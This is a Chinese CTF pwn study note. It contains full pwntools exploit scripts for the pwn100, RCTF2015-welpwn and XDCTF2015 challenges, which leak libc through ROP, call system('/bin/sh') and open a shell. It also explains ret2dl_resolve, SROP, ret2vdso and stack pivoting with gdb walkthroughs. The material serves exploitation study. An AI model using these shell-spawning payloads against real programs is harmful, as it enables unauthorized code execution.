本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：

**1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；**

**2）puts函数与write函数不同，不能指定输出字符串的长度。**

根据上文给出的解决方法，构造利用脚本如下。

```python
from pwn import *
import binascii
p = process("./pwn100")
elf = ELF("./pwn100")
readplt = elf.symbols['read']
readgot = elf.got['read']
putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
mainaddress =   0x4006b8
startaddress =   0x400550
poprdi =     0x400763
pop6address  =  0x40075a   
movcalladdress = 0x400740
waddress =     0x601000 #可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以  
def leak(address):
  count = 0
  data = ''
  payload = "A" * 64 + "A" * 8
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(startaddress)
  payload = payload.ljust(200, "B")
  p.send(payload)
  print p.recvuntil('bye~n')
  up = ""
  while True:
    c = p.recv(numb=1, timeout=0.5)
    count += 1
    if up == 'n' and c == "":
      data = data[:-1]
      data += "x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF('./pwn100'))
systemAddress = d.lookup('__libc_system', 'libc')
print "systemAddress:", hex(systemAddress)
print "-----------write /bin/sh to bss--------------"
payload1 = "A" * 64 + "A" * 8
payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)
payload1 += p64(movcalladdress)
payload1 += 'x00'*56
payload1 += p64(startaddress)
payload1 =  payload1.ljust(200, "B")
p.send(payload1)
print p.recvuntil('bye~n')
p.send("/bin/shx00")
print "-----------get shell--------------"
payload2 = "A" * 64 + "A" * 8
payload2 += p64(poprdi) + p64(waddress)
payload2 += p64(systemAddress)
payload2 += p64(startaddress)
payload2 =  payload2.ljust(200, "B")
p.send(payload2)
p.interactive()
```



**RCTF2015-welpwn**



本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。

 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“x00”字符。

 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。

```makefile
from pwn import *
import binascii
p = process("./welpwn")
elf = ELF("welpwn")
readplt = elf.symbols["read"]
readgot = elf.got["read"]
writeplt = elf.symbols["write"]
writegot = elf.got["write"]
startAddress =    0x400630
popr12r13r14r15  = 0x40089c
pop6address    = 0x40089a
movcalladdress  = 0x400880
def leak(address):
  print p.recv(1024)
  payload = "A" * 24
  payload += p64(popr12r13r14r15)
  payload += p64(pop6address) + p64(0) + p64(1) + p64(writegot) + p64(8) + p64(address) + p64(1)
  payload += p64(movcalladdress)
  payload += "A" * 56
  payload += p64(startAddress)
  payload =  payload.ljust(1024, "C")
  p.send(payload)
  data = p.recv(4)
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
dynelf = DynELF(leak, elf=ELF("./welpwn"))
systemAddress = dynelf.lookup("__libc_system", "libc")
print hex(systemAddress)
bssAddress = 0x601070
poprdi =     0x4008a3
print p.recv(1024)
payload = "A" * 24
payload += p64(popr12r13r14r15)
payload += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(bssAddress) + p64(0)
payload += p64(movcalladdress)
payload += "A" * 56
payload += p64(poprdi)
payload += p64(bssAddress)
payload += p64(systemAddress)
payload = payload.ljust(1024, "C")
p.send(payload)
p.send("/bin/shx00")
p.interactive()
```

由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。

```kotlin
def leak(address):
  count = 0
  data = ''
  print p.recv(1024)
  payload = "A" * 24
  payload += p64(popr12r13r14r15)
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(startAddress)
  payload = payload.ljust(1020, "B")
  p.send(payload)
  #由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据
  print p.recvuntil("x9cx08x40") 
  up = ""
  while True:
    c = p.recv(1)
    count += 1
    if up == 'n' and c == "W": #下一轮输出的首字母就是“Welcome”中的“W”
      data = data[:-1]
      data += "x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
```



#### 借助LibcSearch实现无libc漏洞利用

```
#1、可栈溢出
offset = 0x6C + 0x4

#利用write函数暴露libc基地址，返回到main函数继续使用栈溢出
write_got = pwn.got["write"]
write_plt = pwn.plt["write"]

main_addr = 0x80484BE

#p32(1)和p32(4)是传递参数的作用
payload = b'a'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

p.sendlineafter(b'Welcome to XDCTF2015~!\n',payload)

write_addr = u32(p.recv(4))
print(hex(write_addr))

#没有libc，因此需要借助LibSearch库或者DynELF库
libc = LibcSearcher("write",write_addr)
base = write_addr - libc.dump("write")
system_addr = base + libc.dump("system")
bin_sh_addr = base + libc.dump("str_bin_sh")
exec_addr = base + libc.dump("execve")

#p32对应的是rsp寄存器
payload  = b'a' * offset + p32(system_addr) + p32(0) + p32(bin_sh_addr)
p.sendlineafter(b'Welcome to XDCTF2015~!\n',payload)
p.interactive()
```

```
payload = b'a' * offset + p64(poprdi_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
payload = payload.ljust(200,b'b')
p.send(payload)
p.recvuntil('bye~\x0a') 
puts_addr = u64(p.recvuntil(b'\x0a')[:-1].ljust(8, b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
print(hex(system_addr))
```



### ret2dl_resolve简述

> 比ret2libc更加通用的方式，不过很麻烦，因为需要连接动态库，从而劫持修改成想要的函数



`ret2dlresolve`（Return-to-DL Resolve）是一种利用动态链接器（DL）来实现代码注入和漏洞利用的技术。在理解`ret2dlresolve`之前，我们需要了解一些背景知识：

1. **动态链接器**：在Unix-like系统中，动态链接器是一个负责在程序运行时加载和链接共享库（如`.so`文件）的程序。它负责将程序中对共享库的调用映射到实际的共享库代码，并解析符号（函数和变量）引用。

2. **漏洞利用**：在软件中发现漏洞后，攻击者可以通过利用这些漏洞来实现某些目的，例如执行任意代码、提权等。漏洞利用通常包括修改程序的控制流以执行恶意代码。

`ret2dlresolve`利用了动态链接器的一些特性来实现代码注入和执行。其基本思想是利用程序中的一个漏洞，将控制流指向包含在程序中的某个函数调用，该函数调用本身并不包含在程序的代码段中，而是在动态链接器中。攻击者可以构造一个特殊的栈帧，使程序返回到动态链接器中的特定函数，从而执行恶意代码。

具体来说，`ret2dlresolve`利用了两个关键特性：

- **动态链接器的延迟绑定（Lazy Binding）**：动态链接器通常会延迟绑定共享库中的函数，直到程序第一次调用这些函数时才会进行绑定。这意味着即使共享库已加载，其中的函数地址也可能尚未解析。攻击者可以利用这一特性，使程序跳转到动态链接器中的特定函数调用，触发动态链接器解析符号的过程。

- **`.got.plt`表（Global Offset Table Procedure Linkage Table）**：`.got.plt`是一个特殊的数据结构，用于在程序运行时存储动态链接库函数的地址。攻击者可以通过修改`.got.plt`表中的某些条目，使其指向动态链接器中的特定函数，从而实现控制流劫持。

总之，`ret2dlresolve`是一种利用动态链接器的特性来实现漏洞利用的技术，它允许攻击者执行代码注入和控制流劫持，从而实现对受影响程序的控制。



### ret2dl_resolve的前置知识

![image-20240314095834012](${images}/image-20240314095834012.png)



**需要用到的节：**

#### .dynamic

> 含有指向.dynstr、.dynsym、.rel.plt的指针

结构如下

```c
typedef struct
{
  Elf32_Sword   d_tag;                  /* Dynamic entry type */
  union
    {
      Elf32_Word d_val;                 /* Integer value */
      Elf32_Addr d_ptr;                 /* Address value */
    } d_un;
} Elf32_Dyn;
```

关注里面的东西：



##### DT_STRTAB

处于.dynamic(0x00600E20)+(0x80)[当前文件下]

> 该元素保存着符号名、库名，以及一些其他的在该表的字符串。指向.dynstr



##### DT_SYMTAB

处于.dynamic(0x00600E20)+(0x90)[当前文件下]

> 存放符号表地址，对32-bit类型的文件来说，关联着一个Elf32_Sym入口。指向.dynsym



##### DT_JMPREL

处于.dynamic(0x00600E20)+(0xF0)[当前文件下]

> 假如存在，它的入口d_ptr成员保存着重定位入口（该入口单独关联着
> PLT）的地址。假如lazy方式打开，那么分离它们的重定位入口让动态连接
> 器在进程初始化时忽略它们。假如该入口存在，相关联的类型入口DT_PLTRELSZ和DT_PLTREL一定要存在。指向.rel.plt。
>
>
> 简单理解：事关plt的



###### ld.so加载器

> 相应的配置文件是/etc/ld.so.conf，指定so库的搜索路径，是文本文件，也可以通过定义$LD_LIBRARY_PATH的环境变量来指定程序运行时的.so文件的搜索路径。



#### .dynstr

> 动态链接的字符串表，保存动态链接所需的字符串。
>
> 比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。



#### .dynsym

> 动态链接的符号表，保存所需要动态链接的符号表，而.dynsym结构如下
>
> ```C
> typedef struct
> {
>   Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
>   Elf32_Addr    st_value;
>   Elf32_Word    st_size;
>   unsigned char st_info;
>   unsigned char st_other;
>   Elf32_Section st_shndx;
> }Elf32_Sym; 
> ```



#### .rel.plt

> 节的每个表对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下
>
> ```c
> typedef struct{
>   Elf32_Addr r_offset;//指向GOT表的指针，即该函数在got表的偏移
>   Elf32_Word r_info;
> }Elf32_Rel
> ```



#### 如何快速查看这三个参数？

```
info files
```

首地址即为地址

![image-20240314161133405](${images}/image-20240314161133405.png)

![image-20240314161559853](${images}/image-20240314161559853.png)



#### **重要：_dll_runtime_resolve函数**

> 重定位函数，即达到动态修改自身地址达到重定位的效果。此函数没有延迟绑定机制，需要两个参数，一个是“reloc_arg”，就是函数自己的plt表项push的内容，另外一个是link_map，处于公共plt表项push进栈的，通过它可以找到.dynamic的地址

##### 内部流程

![image-20240315120123880](${images}/image-20240315120123880.png)

分别来看这个函数的两个参数：link_map_obj，里面存放的是一段地址。reloc_index，里面存放的是重定位索引

1. 在一参link_map_obj中存放的其实是一段地址，这个地址就是.dynamic段的基地址

2. 在.dynamic中可以在0x44偏移处找到.dynstr（动态字符串表）的基地址
3. 在0x4c偏移处可以找到.dynsym（动态符号表）的基地址
4. 在0x84偏移处可以找到.rel.plt（重定位表）的基地址
5. .rel.plt（重定位表）的基地址加上二参reloc_index的重定位索引值（可以看做偏移）可以得到函数对应的Elf32_Rel结构体指针
6. Elf32_Rel结构体中有两个成员变量：r_offset和r_info，将r_info右移8可以得到函数在.dynsym（符号表）中的下标
7. .dynsym（符号表）的基地址加上函数在.dynsym的下标，可以得到函数名在.dynstr（字符串表）中的偏移name_offset
8. .dynstr（字符串表）的基地址加上name_offset就可以找到函数名了

原文链接：https://blog.csdn.net/qq_41202237/article/details/107378159



##### 可能会不懂的地方

###### 问题1：为什么.rel.plt（重定位表）加上二参reloc_index之后就能找到结构体指针？

首先看.rel.plt的结构体是这样的：

```
typedef struct{
  Elf32_Addr r_offset;
  Elf32_Word r_info;
}Elf32_Rel
```


也就是说在.rel.plt中存放的内容都是以[r_offset1,r_info1]、[r_offset2,r_info2]、[r_offset3,r_info3]…这种形式存放的，.rel.plt中有多少个函数，就会有多少个这样的组合，可以使用命令“readelf -x .rel.plt main”查看.rel.plt中的内容:

![img](${images}/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70.png)

可以看到都是以这种方式进行排列的，我们现在看到的其实是以小端序的方式排列的。拿第一个结构体举例，正常的显示方式应该是r_offset：0x0804a00c，r_info：0x00000107

###### 问题2：为什么要对r_info进行右移8的操作？

依然还是拿第一个结构体举例，r_info是0x00000107，107代表的是偏移为1的导入函数，07代表的是导入函数的意思，你可以把07看做成一个标志位，真正进行偏移运算的只有前面的1，所以需要对r_info进行右移8的操作将后面的标志位07去掉，保留前面需要计算的偏移

###### 问题3：下标和偏移一样吗？

下标和偏移本质来说一样，但是滑动的单位不一样。下标是以结构体为单位的，而偏移是以字节为单位的。所以前面.dynsym（符号表）的基地址加上函数在.dynsym的下标，实际上找的是在.dynsym中的第几个结构体



##### 攻击思路

> 由于只需要知道_dl_runtime_resolve函数的执行流程后，那么，是不是只需要此函数的第二个参数reloc_index就对应着一个函数，只需要控制对应地址的内容那么就可以控制解析的函数

1. 控制程序执行_dl_runtime_resolve函数
   				a、给定link_map和reloc_index两个参数
      				b、或者给定plt0对应的汇编代码，在给个reloc_index即可
2. 控制reloc_index大小，方便指向伪造（控制的区域），伪造一个指定的重定位表项
3. 伪造重定位表项，使得重定位表项所指的符号也在自己控制范围内(即函数)
4. 伪造符号内容，从而使得符号对应的名称也在自己控制的范围内(即函数)	





原文链接：https://blog.csdn.net/qq_41202237/article/details/107378159

#### 延迟绑定机制

> **延迟绑定(Lazy Binding)** 的基本思想是 **函数第一次被调用时才进行绑定(符号查找、重定位等)**，如果没有则不进行绑定。要实现 **延迟绑定** 需要使用到名为 **PLT(Procedure Linkage Table)** 的方法。
> 而通常延迟绑定机制又是通过调用 **_dl_runtime_resolve函数**来实现的，这也正是此函数没有延迟绑定的原因。



#### _dl_fixup()函数

_dl_fixup()函数在/elf/dl_runtime.c中实现，解析导入函数的真实地址，并改写got表



### ret2dl_resolve的使用条件

#### RELRO情况

##### Full RELRO

> 禁用延迟绑定，即所有的导入符号即加载即导入，.got.plt段被完全初始化为只读
>
> 这种情况就很难使用ret2dl_resolve的思路

> 不可以用
>

##### NO RELRO

> 这种情况下的dynamic可写，由于动态加载器是从.dynamic段的DT_STRTSB条目中来获取.dynstr段的地址，此条目的位置是已知的，且可写，那么可修改此条目的内容，欺骗动态加载器，使其认为.dynstr段在.bss上，同时伪造加的字符串表，当解析函数时，即使用不同的基地地址找函数名，最终指向我们希望其执行的函数

> 可以用
>

##### Partial RELRO

> 此时.dynamic段被标记为只读，不可写，但relloc_arg对应的ELF_REL在rel.plt段上的偏移，动态加载器将其加上rel.plt的基地址来获取目标ELF_REL的地址，当这个内存地址超过了.rel.plt段，并达到.bss时，即可伪造ELF_REL，使r_offset是一个可写的内存地址，来将解析后的函数地址写到那里。同理，使r_info是一个将能将动态装载器导向攻击着控制内存的下标，指向一个位于它后面的ELF_SYM，而ELF_SYM中的st_name指向希望执行的函数即可

> 可以用



##### _dll_runtime_resolve干了什么

1. 有两个参数，一个是**reloc_arg**，用于存放**Elf32_Rel指针**对**.rel.plt段**的偏移量，一个是**link_map**，存放着**.dynamic段**的地址
2. 通过**.dynamic**可以找到**.dynstr(+0x80)、dynsym(+0x90)、dynamic(+0xF0)的地址**
3. **rel.plt的地址**加上**reloc_arg**可以的到函数定位表项**Elf32_Rel**的指针，里面存放着两个变量**r_offset**和**r_info**
4. 将**r_info>>8**可以得到**.dynsym**的下标
5. **dynstr+下标(name_offset)**得到的就是**st_name**，而**st_name**存放的就是要调用函数的函数名
6. 在动态链接库找到该函数后，将地址赋给**.rel.plt**中的对应条目的**r_offset**：指向对应**got表**的指针，赋值给GOT表后，以此函数的动态链接就完成了

##### 实例、跟随查找过程

```c
#include<stdio.h>
#include <unistd.h>

int main()

{
  char buf[200];
  setbuf(stdin, buf);
  read(0, buf, 128);
  puts(buf);

  return 0;

}
```
编译

```shell
gcc -o dynamic -m32 -fno-stack-protector -g hello_pwn.c
```

gdb调试

```
gdb dynamic
```

反汇编的函数，使其看到main函数的汇编

```
disass main
```

放置断点在read函数

```
b read
```

```
r
```

![image-20240314155426629](${images}/image-20240314155426629.png)

然后si进入函数，跳到函数自己的plt表项

可以看到先跳入了ebx+0x14，看一下这里面有什么

![image-20240314155523918](${images}/image-20240314155523918.png)

```
p $ebx+0x14
```

有个地址，然后使用x/wx查看内存中的内容

![image-20240314155724209](${images}/image-20240314155724209.png)

```
x/wx 0x56559008
```

![image-20240314160356894](${images}/image-20240314160356894.png)

![image-20240314160419056](${images}/image-20240314160419056.png)

可以得知就是跳到下一行push了一个0x10(_dll_runtime_resolve函数的relloc_arg参数（Elf_Rel在rel.plt中的偏移）),然后jmp到0x56556020，而这里便是公共的plt表项

![image-20240314155823583](${images}/image-20240314155823583.png)

![image-20240314160150535](${images}/image-20240314160150535.png)

在这里上面存放link_map参数

下面存放_dll_runtime_resolve函数的地址

由此，得知link_map的地址，找到.dynamic的地址，从而找到在dynamic里的各种节的地址，那么，此时，访问到link_map地址里的内容从而获取指向.dynamic的地址，从而解析这个指向地址的内容，从而获取到.dynamic的地址

![image-20240314160839759](${images}/image-20240314160839759.png)

第三个即为.dynamic地址

这里插入一个指令可以快速查看该地址

```
info files
```

![image-20240314161133405](${images}/image-20240314161133405.png)

通过前置知识，可以得知.dynstr, .dynsym, .rel.plt的位置依次如下

![image-20240314161436640](${images}/image-20240314161436640.png)

当然，info files也可以看到，还有范围

![image-20240314161559853](${images}/image-20240314161559853.png)

此时，访问.rel.plt所在地址的内容，

.rel.plt的地址加上参数relloc_arg得到的地址即是重定位表项Elf32_Rel的指针，记作rel

![image-20240314162013019](${images}/image-20240314162013019.png)

得到r_offset = 0x4004 （重定位前） ，r_info = 0x00000207

然后将r_info>>8，即0x00000207>>8 = 1作为.dynsym的下标，此时来到.dynsym的位置，找read函数的名字字符串偏移；

```
x/20x 0x5655520c
```

从而得到

![image-20240314162755695](${images}/image-20240314162755695.png)

偏移量为name_offset为0x1b，此时再用dynstr+偏移量则得到这个函数的函数名的地址(st_name)

不知道为啥我是第三位才是read(即+0x22)

即0x565552bc+0x22

![image-20240314164014736](${images}/image-20240314164014736.png)



动态链接库查找该函数后，把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针，赋值给GOT表后，把控制权返还给read。

于是调试结束

————————————————

```
                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
```

原文链接：https://blog.csdn.net/jzc020121/article/details/116312592





### ret2Vdso简述

> Vdso也就是Virtual Dynamic Shared Object(虚拟动态共享对象)(在内核中的动态库.so)包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里面的函数。Vdso里面封装了这几个函数，其作用主要是加快对于某些对速度要求很高的系统调用

[linux kernel pwn学习之劫持vdso_vdso劫持-CSDN博客](https://blog.csdn.net/seaaseesa/article/details/104694219)



### ret2Vsdo利用

> 里面的int 80可以被利用来构造SROP
>
> 以及vsyscall的ret





### ret2Vsdo检查

在main函数或者随便一个函数下断点，输入vmmap查看

![image-20240411201220853](${images}/image-20240411201220853.png)



### SROP简述

> SROP：Sigreturn Oriented Programming(面向Sigreturn的编程)，其中sigreturn是一个系统调用，在unix系统发生signal(信号)的时候会被间接地调用。



#### signal机制

> 进程之间相互传递信息的一中方法。一般称为软中断。（比如int 80）

![image-20240415172809289](${images}/image-20240415172809289.png)

图的解释：

1. 内核向进程发送signal信号机制，那么就会使得进程被挂起，进入内核态

2. 此时内核保存相应的上下文，**将所有的寄存器压入栈，并且压入所有的Signal信息，指向sigreturn(int 80h)的系统调用地址。**

3. 栈的结构如下
   | unix signals<br />stack |          |
   | :---------------------: | :------- |
   |      **ucontext**       |          |
   |       **siginfo**       |          |
   |      **sigreturn**      | **<=sp** |


4. 称ucontext和siginfo这段为Signal Frame，**这一部分存在于用户进程的地址空间的。**

5. 然后跳转到注册过的signal handler中处理相应的signal。当这个handler执行完后，就会执行sigreturn代码

6. sigcontext结构：
	- x86
	
	  ```c
	  struct sigcontext
	  {
	    unsigned short gs, __gsh;
	    unsigned short fs, __fsh;
	    unsigned short es, __esh;
	    unsigned short ds, __dsh;
	    unsigned long edi;
	    unsigned long esi;
	    unsigned long ebp;
	    unsigned long esp;
	    unsigned long ebx;
	    unsigned long edx;
	    unsigned long ecx;
	    unsigned long eax;
	    unsigned long trapno;
	    unsigned long err;
	    unsigned long eip;
	    unsigned short cs, __csh;
	    unsigned long eflags;
	    unsigned long esp_at_signal;
	    unsigned short ss, __ssh;
	    struct _fpstate * fpstate;
	    unsigned long oldmask;
	    unsigned long cr2;
	  };
	  ```
	
	- x64
	
	  ```c
	  struct _fpstate
	  {
	    /* FPU environment matching the 64-bit FXSAVE layout.  */
	    __uint16_t        cwd;
	    __uint16_t        swd;
	    __uint16_t        ftw;
	    __uint16_t        fop;
	    __uint64_t        rip;
	    __uint64_t        rdp;
	    __uint32_t        mxcsr;
	    __uint32_t        mxcr_mask;
	    struct _fpxreg    _st[8];
	    struct _xmmreg    _xmm[16];
	    __uint32_t        padding[24];
	  };
	  
	  struct sigcontext
	  {
	    __uint64_t r8;
	    __uint64_t r9;
	    __uint64_t r10;
	    __uint64_t r11;
	    __uint64_t r12;
	    __uint64_t r13;
	    __uint64_t r14;
	    __uint64_t r15;
	    __uint64_t rdi;
	    __uint64_t rsi;
	    __uint64_t rbp;
	    __uint64_t rbx;
	    __uint64_t rdx;
	    __uint64_t rax;
	    __uint64_t rcx;
	    __uint64_t rsp;
	    __uint64_t rip;
	    __uint64_t eflags;
	    unsigned short cs;
	    unsigned short gs;
	    unsigned short fs;
	    unsigned short __pad0;
	    __uint64_t err;
	    __uint64_t trapno;
	    __uint64_t oldmask;
	    __uint64_t cr2;
	    __extension__ union
	      {
	        struct _fpstate * fpstate;
	        __uint64_t __fpstate_word;
	      };
	    __uint64_t __reserved1 [8];
	  };
	  ```
	
7. signal handler返回后，内核为执行sigretrun系统调用，为进程恢复保存的上下文，包括压入的寄存器，并pop回对应的寄存器，最后恢复进程的执行，其中32位的sigreturn的调用号为119（0x77），64位为15（0xf）



#### 攻击原理

> 修改保存的上下文，即修改Signal Frame
>
> - Signal Frame被保存在用户的地址空间里，用户可读写。
> - 内核和信号处理系统无关，因此内核不记录这个Signal对应的Signal Frame，所以当执行sigreturn系统调用的时，此时的Signal Frame不一定是之前内核为用户进程保存的Signal Frame



##### 获取shell

> 如若有个栈溢出，或者能控制用户进程的栈，那么伪造一个Signal Frame

x64的例子

| offset |     register      |     register     |
| :----: | :---------------: | :--------------: |
|  0x00  |   rt_sigreturn    |     uc_flags     |
|  0x11  |        &uc        |  uc_stack.ss_sp  |
|  0x20  | uc_stack.ss_flags | uc_stach.ss_size |
|  0x30  |        r8         |        r9        |
|  0x40  |        r10        |       r11        |
|  0x50  |        r12        |       r13        |
|  0x60  |        r14        |       r15        |
|  0x70  | rdi = &"/bin/sh"  |       rsi        |
|  0x80  |        rbp        |       rbx        |
|  0x90  |        rdx        | rax = 59(execve) |
|  0xA0  |        rcx        |       rsp        |
|  0xB0  |  rip = &syscall   |      eflags      |
|  0xC0  |   cs / gs / fs    |       err        |
|  0xD0  |      trapno       | oldmask(unused)  |
|  0xE0  |   cr2(segfault)   |     &fpstate     |
|  0xF0  |     _reserved     |     sigmask      |

当系统执行完sigreturn系统调用后，会执行一系列的pop指令以便恢复相应寄存器的值，当执行到rip的时候，就会让程序执行流指向syscall地址，根据相应寄存器的值，此时，就会得到一个shell



##### system call chains

> 以上的构造成一个而已
>
> 修改两处地方即可构造成链
>
> - 控制栈指针
> - 将原本rip指向的syscall gadget换成syscall；ret gadget
>
> ![image-20240415182743665](${images}/image-20240415182743665.png)



##### ROP需要满足的条件

- 可控制栈溢出来控制栈的内容
- 知道对应的地址
  - “/bin/sh”
  - Signal Frame
  - syscall
  - sigreturn
- 需要足够大的空间塞下整个signal frame



##### 另外

![image-20240415183006652](${images}/image-20240415183006652.png)

如果开启ASLR，也就是SROP的地址随机化的话

可以直接在 vsyscall 中的固定地址处找到 syscall&return 代码片段。

![image-20240415183058042](${images}/image-20240415183058042.png)

目前它已经被`vsyscall-emulate`和`vdso`机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。

值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数

##### 利用工具

**值得一提的是，在目前的 pwntools 中已经集成了对于 srop 的攻击。**



### 栈迁移

> 也就是相当于把栈顶换了，换成我们提前部署好的



由于存在栈溢出漏洞，我们可以把栈覆盖成如下

![image-20240314192450340](${images}/image-20240314192450340.png)

由于调用read函数会在fake_ebp1写下0x100个字节，我们称此地址为fake_ebp2

read调用结束后esp来到返回地址执行leave_ret

![image-20240314192444720](${images}/image-20240314192444720.png)

首先执行mov esp,ebp命令；执行结束后，esp和ebp寄存器里面的值相同，且都指向bss段的地址fake ebp1

![image-20240314192438497](${images}/image-20240314192438497.png)

然后执行pop ebp;命令，由于fake ebp1指向fake_ebp2,所以pop后ebp指向fake_ebp2。

![image-20240314192430270](${images}/image-20240314192430270.png)

执行pop后，esp会减一个单位，如果这里刚好有我们一不小心部署好的函数地址，那就比较令人开心了。因为随后执行的ret命令，将会刚好执行此函数。

而这就是栈迁移的原理。

### Call指令的诞生与消亡

众所周知，执行call指令时会对栈进行初始化，开辟一块空间给被调用的函数使用，而通常会用如下指令实现

```
push ebp #把ebp放进栈，即saved ebp
mov  ebp,esp
```

而call命令结束的时候则将这块空间还回去，以如下指令实现

```
leave
ret
```

其中leave命令又相当于mov esp,ebp ; pop ebp；

那么有意思的事情就来了，如果我们在执行leave命令之前，让ebp指向一个我们所希望的地址，那么理论上，pop ebp；之后，esp将-1个单位(4或8位)，然后继续执行我么所希望地址上的函数，那么这就会很令人开心了。

而这个方法就是所谓的栈迁移。
————————————————

```
                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
```

原文链接：https://blog.csdn.net/jzc020121/article/details/116312592



### 条件竞争



​		简单来说就是当执行一个条件的时候，如果这个条件可以多次使用，那么在执行这个条件的同时，可以对此条件进行争取一些操作，执行相应的操作，则此操作为条件竞争。（全称应该为：和这些条件进行竞争时间争取进行操作）。

​		在CTF pwn挑战中，条件竞争是指在多线程或多进程环境下，程序的不同部分可能会同时尝试访问或修改共享资源（如内存或文件）。如果这些操作没有得到适当的同步，就可能导致程序行为异常，出现安全漏洞。攻击者可以利用这种漏洞来执行未授权的操作，比如执行任意代码。简单来说，就是程序的不同部分在没有协调好的情况下“赛跑”，看谁先到达某个关键点，从而可能被利用来破坏程序的正常运行。

